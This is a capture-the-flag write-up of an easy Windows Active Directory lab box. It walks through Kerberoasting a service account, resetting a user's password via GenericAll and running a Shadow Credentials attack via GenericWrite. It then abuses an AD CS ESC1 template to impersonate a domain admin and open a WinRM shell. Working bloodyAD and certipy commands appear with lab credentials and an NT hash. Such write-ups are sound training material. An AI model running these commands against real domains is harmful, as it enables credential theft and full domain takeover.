---
title: HackSmarter - Arasaka
date: 2026-06-29
image: cover.png
tags: [HackSmarter, Easy, Windows, Active Directory]
excerpt: An easy Active Directory box that Kerberoasts a service account, chains GenericAll and GenericWrite edges to reset a user and run a Shadow Credentials attack, then abuses an AD CS ESC1 template to impersonate a Domain Admin and recover its NT hash for a WinRM shell.
---

# Arasaka

### Starting Credentials

```bash
faraday:hacksmarter123
```

### NMAP Scanning

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-29 12:08:59Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   DNS_Tree_Name: hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-29T12:09:50+00:00
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Issuer: commonName=DC01.hacksmarter.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-28T12:02:34
| Not valid after:  2026-12-28T12:02:34
| MD5:   63ff:4e5c:8188:2367:21b2:7a3f:bcda:74d4
| SHA-1: 4655:94d4:e962:801f:ac89:f8d2:e7e5:8b0c:1f77:ee3d
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQWSJ65u7gMb5IoPbkL7oUFTANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZEQzAxLmhhY2tzbWFydGVyLmxvY2FsMB4XDTI2MDYyODEyMDIz
| NFoXDTI2MTIyODEyMDIzNFowITEfMB0GA1UEAxMWREMwMS5oYWNrc21hcnRlci5s
| b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALM7ZLFqvfMLyTCy
| sugo5z6nms0CAvbWNScxlIMKA0A5neIxKwZlcw8qmIF7pCCbPCZJl0vlA6WMNzai
| SvjsKE1mLjbPzNop7LOv3rtD5ZD6UuTq9tqTn4cOoTH1KiKox3K47EST/rMaSM+X
| DAcmw29ZdRS0v21Yh2kROT3K9+kyBdyfNrYDt76kuizfmRZezwKB0bTXfiXtiC4l
| HL7vqJR1mnnKISnPby9s5sOy/xBbyW1DpgV4rwR3qRjluLI0aAdg+TTvGkP5FjD6
| imJR8oskUAQvHvEnLm3rOHtzGP0Ub8PbNp9X0ZViBMiV0SpV1nug1TYoginU8eNz
| WtcJ4cECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQAfJaVLb2MJ3DfRqUeGV9EKYSbGGpLzb9J9kv+H
| smdGPmBI0bpxzS6qonuOnxJfcrNJCm4yIhaHeDXNaVJ8CFZdziHhcrlItKTbYxad
| 5rePyaui8dIWmyamUkE/JnkbeWFyHzEBmlxg7Z0KZH+PdUW/BGPwIAFIrf4FTO1C
| wkPB214Ce7dJkKpPIpPQAF/eUuGhK7w/eSKwbnGpEfEsvy8DRFVHbUKy92ttTAEq
| bpul0hRYQsHYTkoYm+AQUK/ENOCtr21a24aQ68k2WP2glJSv1dhWMj2hA+50Yrda
| kf9IBaVhYxlONzVvGN3X5+DcbKyZh8XhsgvnyD89muOnBtIs
|_-----END CERTIFICATE-----
|_ssl-date: 2026-06-29T12:10:29+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51387/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
51389/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51401/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51415/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51434/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51442/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 41282/tcp): CLEAN (Timeout)
|   Check 2 (port 2884/tcp): CLEAN (Timeout)
|   Check 3 (port 44724/udp): CLEAN (Timeout)
|   Check 4 (port 44446/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-29T12:09:51
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```

### Active Directory - Domain Reconnaissance

With a valid pair of credentials in hand, the domain can be enumerated with `rusthound-ce`. Before that, update the `/etc/hosts` file so the domain and host resolve correctly:

{% image %}

```bash
10.1.18.140	DC01.hacksmarter.local hacksmarter.local
```

A `krb5.conf` file can also be generated automatically with netexec, which is required for the Kerberos-based authentication used later in the chain:

{% image2 %}

Running the domain enumeration with `rusthound-ce`:

```bash
rusthound-ce --domain hacksmarter.local --ldapusername faraday --ldappassword 'hacksmarter123' --ldapfqdn DC01.hacksmarter.local --ldapip 10.1.18.140 --name-server 10.1.18.140 --collectionmethod All --zip
```

{% image3 %}

Uploading the resulting zip into the BloodHound interface and analyzing the graph starting from the current user.

The All Kerberoastable Users query returns a hit on the `ALT.SVC` account, which has an SPN registered and is therefore Kerberoastable:

{% image4 %}

Requesting the service ticket hash for that account with `impacket-GetUserSPNs`:

{% image5 %}

Saving the hash to a new file and cracking it offline with `john`:

{% image6 %}

The password cracks successfully. Validating it with a `netexec` SMB query to confirm it works and to check whether any new shares become visible:

{% image7 %}

### Active Directory - Lateral Movement

No new shares appear, but BloodHound shows that this account holds `GenericAll` over the `YORINOBU` user:

{% image8 %}

It also holds `GenericWrite` over the `SOULKILLER.SVC` user:

{% image9 %}

The path is straightforward. `GenericAll` over `YORINOBU` allows resetting its password, and that account belongs to both the Remote Desktop Users and Remote Management Users groups, which grants interactive access over RDP and WinRM.

The `GenericWrite` over `SOULKILLER.SVC` enables a Shadow Credentials attack against it. The account description indicates it handles certificate management for the soulkiller AI, which points toward an AD CS escalation path:

{% image10 %}

Once `SOULKILLER.SVC` is compromised, `certipy` can enumerate the certificate templates for anything abusable.

Starting by resetting the password of the `YORINOBU` user:

```bash
bloodyAD -d hacksmarter.local -u 'alt.svc' -p 'babygirl1' -i 10.1.18.140 set password YORINOBU 'Password123!'
```

{% image11 %}

Performing the Shadow Credentials attack against `SOULKILLER.SVC`, which injects a key credential into the account and returns its NT hash:

```bash
certipy-ad shadow auto -u yorinobu@hacksmarter.local -p 'Password123!' -dc-ip 10.1.18.140 -account 'SOULKILLER.SVC'
```

{% image12 %}

Enumerating the certificate templates with `certipy-ad`:

```bash
certipy-ad find -u soulkiller.svc@hacksmarter.local -hashes 'f4ab68f27303bcb4024650d8fc5f973a' -dc-ip 10.1.18.140 -vulnerable -stdout
```

{% image13 %}

The `AI_Takeover` template on the `hacksmarter-DC01-CA` certificate authority is vulnerable to ESC1, where the template lets the enrollee supply an arbitrary Subject Alternative Name and request a certificate as any account.

### Privilege Escalation - Domain Admin Impersonation

Abusing this to impersonate the domain admin account named The Emperor:

{% image14 %}

Authenticating with the issued certificate through PKINIT to recover the NT hash of this domain admin:

{% image15 %}

Connecting with `evil-winrm` using the recovered hash to collect the root flag:

{% image16 %}